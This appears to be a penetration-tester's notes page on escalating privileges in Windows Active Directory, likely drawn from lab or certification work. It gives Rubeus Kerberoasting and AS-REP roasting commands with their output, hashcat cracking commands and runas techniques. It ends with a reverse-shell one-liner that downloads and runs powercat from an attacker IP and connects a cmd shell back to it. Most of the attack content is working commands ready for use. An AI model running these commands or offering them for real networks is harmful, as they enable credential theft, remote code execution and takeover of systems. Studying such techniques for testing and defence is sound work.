# Escalating Privilege

##

## Abusing Active Directory Authentication

Sometimes a way of escalating privileges is by moving laterally. We can take advantage of the same techniques and tools we would use for moving laterally to escalate our privileges.

### Kerberoasting with Rubeus

{% embed url="https://github.com/GhostPack/Rubeus" %}

If Rubeus is not installed we'll have to switch to our Windows dev box and compile via VIsual Studio. We can transfer the binary back to our Kali host then to our victim.

```powershell
PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : corp.com
[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : iis_service
[*] DistinguishedName      : CN=iis_service,CN=Users,DC=corp,DC=com
[*] ServicePrincipalName   : HTTP/web04.corp.com:80
[*] PwdLastSet             : 9/7/2022 5:38:43 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Tools\hashes.kerberoast
```

### Cracking with Hashcat

```shell-session
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...
```



### AS-REP Roasting with Rubeus

```powershell
PS C:\Users\Public> .\Rubeus asreproast /nowrap
.\Rubeus asreproast /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0 


[*] Action: AS-REP roasting

[*] Target Domain          : relia.com

[*] Searching path 'LDAP://DC02.relia.com/DC=relia,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : michelle
[*] DistinguishedName      : CN=Michelle Smith,CN=Users,DC=relia,DC=com
[*] Using domain controller: DC02.relia.com (172.16.103.6)
[*] Building AS-REQ (w/o preauth) for: 'relia.com\michelle'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$michelle@relia.com:0C5BDBDC
```

### Cracking with Hashcat

```bash
kali@kali sudo hashcat -m 18200 michelle.asrep /usr/share/wordlists/rockyou.txt --force
```

## Checking Groups - net user&#x20;

Another way we can check groups a user belongs to is using `net user`

```powershell
PS C:\Users\tony> net user tony
User name                    tony
Full Name                    Nothing Stops
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/16/2023 1:57:34 PM
Password expires             Never
Password changeable          6/16/2023 1:57:34 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
```

## Runas Command

If we've gained access to a plaintext password, it's possible to use the [`runas` ](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\))command to execute commands as that user.

```powershell
PS C:\Users\steve> runas /user:backupadmin cmd
Enter the password for backupadmin:
Attempting to start cmd as user "CLIENTWK220\backupadmin" ...
PS C:\Users\steve> 
```





## Invoke-Runas

If we've gained access to a plaintext password, but don't have a full shell, we can use the [`Invoke-Runas`](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1) command that's part of the[ `PowerShell-Suite`](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master). Here is an updated and new version.&#x20;

{% embed url="https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1" %}

```powershell
PS> import-module ./Invoke-RunasCs.ps1
PS> Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
```



### Spawn reverse shell

Powercat

```powershell
PS> Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.49.211/powercat.ps1');powercat -c 192.168.49.211 -p 5555 -e cmd"
```
